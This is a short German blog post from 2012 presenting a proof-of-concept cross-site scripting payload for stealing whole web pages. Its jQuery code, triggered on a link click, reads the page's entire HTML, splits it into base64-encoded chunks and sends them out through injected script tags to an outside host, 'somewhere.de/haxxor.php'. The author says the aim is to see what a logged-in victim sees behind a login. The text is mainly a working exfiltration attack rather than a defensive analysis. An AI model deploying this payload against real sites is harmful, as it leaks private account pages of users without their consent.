Webpage Transfer via Injection
##############################
:date: 2012-06-19 14:52
:tags: de, javascript, xss

Letztens wurde ich von Freunden gefragt, ob es moeglich sei ueber XSS eine Website komplett
zu uebertragen. Heute mal kurz hingesetzt und eine PoC dazu geschrieben.
Die Idee dahinter ist eigentlich recht leicht.
Wir schnappen uns den den Code der im HTML-Tag liegt, zerhauen ihn in mehrere kleine
Stuecke von ungefaehr 1024 Zeichen und Uebertragen diese ueber eine Einbindung von 
Javascript Code.

.. code-block :: javascript

	$(document).ready(function() {
		lineLength = 1024;
		$("a").click(function() {
			site = $("html").html().replace(/(\r\n|\n|\r)/gm,"");
			for(i = 0; i < Math.ceil(site.length/lineLength); i++) {
				query=i+'&'+base64_encode(site.substr(i*lineLength,lineLength));
				$('body').after('<script type="text/javascript" src="http://somewhere.de/haxxor.php?'+query+'"></script>');
			}
		});
	});


Diese haxxor.php ist eigentlich auch nichts Spektakulaeres. Es macht eine Session auf, 
holt sich die Session ID und speichert den gesamten Query String ab. Das auseinanderfrimmeln
ist recht einfach gemacht am Ende, weil ich die Reihenfolge mit uebergeb. 
Die Funktion base64_encode ist keine Standard Funktion und muss noch selbst implementiert werden.
Zudem base64 ich jedes einzelne Paket, dass fals ein Paket verloren geht, es nicht so dramatisch ist.

Warum nun das ganze, moege man sich fragen? Ganz einfach: man findet eine XSS hinter einem Login, moechte aber
wissen, was der jeweilige Benutzer sieht, und damit wird die Seite uebertragen.

Wie gesagt, es ist ein einfaches PoC. Nur eine Idee, dass es funktioniert. Quick&Dirty.

so long
